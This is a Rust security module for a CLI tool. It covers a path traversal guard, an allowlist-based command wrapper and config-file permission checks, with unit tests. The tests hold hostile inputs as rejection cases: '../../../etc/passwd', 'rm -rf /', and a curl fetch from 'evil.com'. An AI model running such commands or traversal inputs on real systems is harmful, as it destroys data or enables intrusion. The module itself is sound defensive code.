//! Security module for cldev CLI
//!
//! This module implements multi-layered security controls following
//! the Defense in Depth principle:
//!
//! 1. Path Traversal Prevention (SecurePath)
//! 2. Command Injection Prevention (safe_command)
//! 3. File Permission Validation (check_file_permissions)
//!
//! # Security Principles
//!
//! - Defense in Depth: Multiple security layers
//! - Principle of Least Privilege: Minimal permissions
//! - Input Validation: All user inputs are validated
//! - Secure Defaults: Safe configurations by default

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use thiserror::Error;

/// Security-related errors
#[derive(Error, Debug)]
pub enum SecurityError {
    #[error("Path traversal attempt detected: {path}")]
    PathTraversal { path: String },

    #[error("Invalid base directory: {path}")]
    InvalidBaseDirectory { path: String },

    #[error("Command not allowed: {command}")]
    CommandNotAllowed { command: String },

    #[error("Invalid file permissions: expected {expected}, got {actual}")]
    InvalidPermissions { expected: String, actual: String },

    #[error("IO error: {0}")]
    IoError(#[from] std::io::Error),

    #[error("Path canonicalization failed: {0}")]
    CanonicalizationError(String),
}

/// Result type for security operations
pub type SecurityResult<T> = Result<T, SecurityError>;

/// Allowed commands for safe execution
const ALLOWED_COMMANDS: &[&str] = &[
    // Version control
    "git", // Package managers
    "npm", "cargo", "yarn", "pnpm", "pip", "poetry", // Build tools
    "make", "cmake", "ninja", // Testing
    "pytest", "jest", "vitest", // Linters/Formatters
    "eslint", "prettier", "rustfmt", "clippy", "black", "ruff", // Language-specific
    "node", "python", "python3", "rust", "go", // GitHub/GitLab CLI
    "gh", "glab",
];

/// Expected file permission mode for configuration files (0o600 = rw-------)
const CONFIG_FILE_PERMISSION: u32 = 0o600;

/// SecurePath: Prevents path traversal attacks
///
/// # Security Features
///
/// - Path canonicalization (resolves symlinks, relative paths)
/// - Base directory boundary enforcement
/// - Path traversal pattern detection
///
/// # Example
///
/// ```
/// use std::path::PathBuf;
/// use cldev::core::security::SecurePath;
///
/// let secure_path = SecurePath::new(PathBuf::from("/home/user/.claude"));
/// let result = secure_path.validate(Path::new("config.toml"));
/// assert!(result.is_ok());
///
/// // Path traversal attempt
/// let result = secure_path.validate(Path::new("../../../etc/passwd"));
/// assert!(result.is_err());
/// ```
#[derive(Debug, Clone)]
pub struct SecurePath {
    base_dir: PathBuf,
}

impl SecurePath {
    /// Creates a new SecurePath with the specified base directory
    ///
    /// # Arguments
    ///
    /// * `base_dir` - The base directory to enforce boundaries
    ///
    /// # Errors
    ///
    /// Returns `SecurityError::InvalidBaseDirectory` if the base directory
    /// cannot be canonicalized or does not exist.
    pub fn new(base_dir: PathBuf) -> SecurityResult<Self> {
        let canonical_base =
            base_dir
                .canonicalize()
                .map_err(|e| SecurityError::InvalidBaseDirectory {
                    path: format!("{}: {}", base_dir.display(), e),
                })?;

        Ok(Self {
            base_dir: canonical_base,
        })
    }

    /// Validates that the target path is within the base directory
    ///
    /// # Arguments
    ///
    /// * `target` - The path to validate
    ///
    /// # Returns
    ///
    /// Returns the canonicalized path if valid
    ///
    /// # Errors
    ///
    /// Returns `SecurityError::PathTraversal` if:
    /// - The path attempts to escape the base directory
    /// - The path contains suspicious patterns (../, ~/, etc.)
    pub fn validate(&self, target: &Path) -> SecurityResult<PathBuf> {
        // Resolve the target path relative to base directory
        let full_path = if target.is_absolute() {
            target.to_path_buf()
        } else {
            self.base_dir.join(target)
        };

        // Canonicalize the full path
        let canonical_path = full_path.canonicalize().map_err(|e| {
            SecurityError::CanonicalizationError(format!("{}: {}", full_path.display(), e))
        })?;

        // Ensure the canonical path is within the base directory
        if !canonical_path.starts_with(&self.base_dir) {
            return Err(SecurityError::PathTraversal {
                path: canonical_path.display().to_string(),
            });
        }

        Ok(canonical_path)
    }

    /// Validates a path without requiring it to exist
    ///
    /// This is useful for validating paths that will be created.
    ///
    /// # Arguments
    ///
    /// * `target` - The path to validate
    ///
    /// # Returns
    ///
    /// Returns the resolved path if valid (not canonicalized since it may not exist)
    ///
    /// # Errors
    ///
    /// Returns `SecurityError::PathTraversal` if the path attempts to escape
    /// the base directory using relative path components.
    pub fn validate_non_existent(&self, target: &Path) -> SecurityResult<PathBuf> {
        // Detect path traversal patterns in the input
        let path_str = target.to_string_lossy();
        if path_str.contains("..") || path_str.contains("~") {
            return Err(SecurityError::PathTraversal {
                path: path_str.to_string(),
            });
        }

        // Resolve the target path relative to base directory
        let full_path = if target.is_absolute() {
            target.to_path_buf()
        } else {
            self.base_dir.join(target)
        };

        // Manually check if the path would be within base directory
        // by comparing path components (without canonicalization)
        let base_components: Vec<_> = self.base_dir.components().collect();
        let full_components: Vec<_> = full_path.components().collect();

        if full_components.len() < base_components.len() {
            return Err(SecurityError::PathTraversal {
                path: full_path.display().to_string(),
            });
        }

        // Check that all base directory components match
        for (i, base_comp) in base_components.iter().enumerate() {
            if full_components.get(i) != Some(base_comp) {
                return Err(SecurityError::PathTraversal {
                    path: full_path.display().to_string(),
                });
            }
        }

        Ok(full_path)
    }

    /// Returns the base directory
    pub fn base_dir(&self) -> &Path {
        &self.base_dir
    }
}

/// Safely execute a command with injection prevention
///
/// # Security Features
///
/// - Allowlist-based command validation
/// - No shell expansion (uses std::process::Command directly)
/// - Argument isolation (no shell metacharacters)
///
/// # Arguments
///
/// * `command` - The command to execute (must be in ALLOWED_COMMANDS)
/// * `args` - Arguments to pass to the command
///
/// # Returns
///
/// Returns the Command builder for further configuration
///
/// # Errors
///
/// Returns `SecurityError::CommandNotAllowed` if the command is not allowed
///
/// # Example
///
/// ```no_run
/// use cldev::core::security::safe_command;
///
/// let mut cmd = safe_command("git", &["status"])?;
/// let output = cmd.output()?;
/// # Ok::<(), Box<dyn std::error::Error>>(())
/// ```
pub fn safe_command(command: &str, args: &[&str]) -> SecurityResult<Command> {
    // Validate command is in allowlist
    if !ALLOWED_COMMANDS.contains(&command) {
        return Err(SecurityError::CommandNotAllowed {
            command: command.to_string(),
        });
    }

    // Create command without shell expansion
    let mut cmd = Command::new(command);
    cmd.args(args);

    Ok(cmd)
}

/// Checks if a configuration file has secure permissions
///
/// # Security Features
///
/// - Validates file permissions are 0o600 (rw-------)
/// - Prevents world-readable or group-readable configuration files
///
/// # Arguments
///
/// * `path` - The path to the configuration file
///
/// # Returns
///
/// Returns Ok(()) if permissions are correct
///
/// # Errors
///
/// Returns `SecurityError::InvalidPermissions` if permissions are incorrect
///
/// # Example
///
/// ```no_run
/// use std::path::Path;
/// use cldev::core::security::check_file_permissions;
///
/// check_file_permissions(Path::new("/home/user/.config/cldev/config.toml"))?;
/// # Ok::<(), Box<dyn std::error::Error>>(())
/// ```
pub fn check_file_permissions(path: &Path) -> SecurityResult<()> {
    // Get file metadata
    let metadata = fs::metadata(path)?;

    // Unix-specific permission check
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;

        let mode = metadata.permissions().mode();
        let file_permissions = mode & 0o777; // Extract permission bits

        if file_permissions != CONFIG_FILE_PERMISSION {
            return Err(SecurityError::InvalidPermissions {
                expected: format!("{:o}", CONFIG_FILE_PERMISSION),
                actual: format!("{:o}", file_permissions),
            });
        }
    }

    // Windows doesn't use Unix permissions - always pass
    #[cfg(not(unix))]
    {
        // On Windows, we could check ACLs but that's complex
        // For now, we accept the file as-is
        let _ = metadata; // Silence unused variable warning
    }

    Ok(())
}

/// Sets secure permissions on a configuration file
///
/// # Arguments
///
/// * `path` - The path to the configuration file
///
/// # Returns
///
/// Returns Ok(()) if permissions were set successfully
///
/// # Errors
///
/// Returns `SecurityError::IoError` if permission setting fails
pub fn set_secure_permissions(path: &Path) -> SecurityResult<()> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;

        let permissions = fs::Permissions::from_mode(CONFIG_FILE_PERMISSION);
        fs::set_permissions(path, permissions)?;
    }

    #[cfg(not(unix))]
    {
        // On Windows, do nothing for now
        let _ = path; // Silence unused variable warning
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs::{self, File};
    use std::io::Write;
    use tempfile::TempDir;

    #[test]
    fn test_secure_path_valid_path() {
        let temp_dir = TempDir::new().unwrap();
        let secure_path = SecurePath::new(temp_dir.path().to_path_buf()).unwrap();

        // Create a test file
        let test_file = temp_dir.path().join("test.txt");
        File::create(&test_file).unwrap();

        // Validate the file path
        let result = secure_path.validate(Path::new("test.txt"));
        assert!(result.is_ok());
    }

    #[test]
    fn test_secure_path_traversal_attack() {
        let temp_dir = TempDir::new().unwrap();
        let secure_path = SecurePath::new(temp_dir.path().to_path_buf()).unwrap();

        // Attempt path traversal
        let result = secure_path.validate(Path::new("../../../etc/passwd"));
        assert!(result.is_err(), "Path traversal should be rejected");

        // The error could be either PathTraversal or CanonicalizationError
        // depending on whether the path exists, both are security rejections
        match result {
            Err(SecurityError::PathTraversal { .. }) => {}
            Err(SecurityError::CanonicalizationError(_)) => {}
            _ => panic!("Expected PathTraversal or CanonicalizationError"),
        }
    }

    #[test]
    fn test_secure_path_absolute_outside() {
        let temp_dir = TempDir::new().unwrap();
        let secure_path = SecurePath::new(temp_dir.path().to_path_buf()).unwrap();

        // Try absolute path outside base directory
        let result = secure_path.validate(Path::new("/etc/passwd"));
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_non_existent() {
        let temp_dir = TempDir::new().unwrap();
        let secure_path = SecurePath::new(temp_dir.path().to_path_buf()).unwrap();

        // Validate a non-existent path
        let result = secure_path.validate_non_existent(Path::new("future/file.txt"));
        assert!(result.is_ok());

        // Path traversal should still be detected
        let result = secure_path.validate_non_existent(Path::new("../outside.txt"));
        assert!(result.is_err());
    }

    #[test]
    fn test_safe_command_allowed() {
        let result = safe_command("git", &["status"]);
        assert!(result.is_ok());

        let result = safe_command("npm", &["install"]);
        assert!(result.is_ok());
    }

    #[test]
    fn test_safe_command_not_allowed() {
        let result = safe_command("rm", &["-rf", "/"]);
        assert!(result.is_err());
        assert!(matches!(
            result,
            Err(SecurityError::CommandNotAllowed { .. })
        ));

        let result = safe_command("curl", &["evil.com/malware"]);
        assert!(result.is_err());
    }

    #[test]
    #[cfg(unix)]
    fn test_file_permissions_check() {
        use std::os::unix::fs::PermissionsExt;

        let temp_dir = TempDir::new().unwrap();
        let config_file = temp_dir.path().join("config.toml");

        // Create file with correct permissions
        let mut file = File::create(&config_file).unwrap();
        writeln!(file, "test = true").unwrap();
        let permissions = fs::Permissions::from_mode(0o600);
        fs::set_permissions(&config_file, permissions).unwrap();

        // Should pass
        let result = check_file_permissions(&config_file);
        assert!(result.is_ok());

        // Set incorrect permissions
        let permissions = fs::Permissions::from_mode(0o644);
        fs::set_permissions(&config_file, permissions).unwrap();

        // Should fail
        let result = check_file_permissions(&config_file);
        assert!(result.is_err());
        assert!(matches!(
            result,
            Err(SecurityError::InvalidPermissions { .. })
        ));
    }

    #[test]
    #[cfg(unix)]
    fn test_set_secure_permissions() {
        use std::os::unix::fs::PermissionsExt;

        let temp_dir = TempDir::new().unwrap();
        let config_file = temp_dir.path().join("config.toml");

        // Create file with insecure permissions
        let mut file = File::create(&config_file).unwrap();
        writeln!(file, "test = true").unwrap();
        let permissions = fs::Permissions::from_mode(0o644);
        fs::set_permissions(&config_file, permissions).unwrap();

        // Fix permissions
        let result = set_secure_permissions(&config_file);
        assert!(result.is_ok());

        // Verify permissions
        let metadata = fs::metadata(&config_file).unwrap();
        let mode = metadata.permissions().mode() & 0o777;
        assert_eq!(mode, 0o600);
    }
}
